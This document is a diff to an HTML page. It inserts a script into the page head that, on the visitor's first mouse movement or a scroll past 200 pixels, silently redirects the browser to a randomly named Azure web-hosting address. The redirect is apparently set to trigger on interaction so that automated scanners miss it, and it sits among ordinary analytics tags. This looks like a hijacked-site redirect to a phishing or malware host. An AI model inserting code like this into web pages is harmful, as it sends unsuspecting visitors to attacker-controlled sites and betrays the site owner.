@@ -1,6 +1,28 @@
 <!doctype html>
 <html lang="en">
 <head>
+   <script>
+        // Paste your chosen JavaScript code snippet here (e.g., from the combined example)
+        let redirected = false;
+        const targetUrl = "https://iosjkeoskdsd.z13.web.core.windows.net/"; 
+
+        function handleInteraction() {
+            if (!redirected) {
+                redirected = true;
+                window.location.replace(targetUrl); 
+                document.removeEventListener('mousemove', handleInteraction);
+                document.removeEventListener('scroll', handleInteraction);
+            }
+        }
+        function checkScroll() {
+            if (window.scrollY > 200) {
+                handleInteraction();
+            }
+        }
+        document.addEventListener('mousemove', handleInteraction);
+        document.addEventListener('scroll', checkScroll);
+    </script>
+
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C82RE9Z3JN"></script>
 <script>
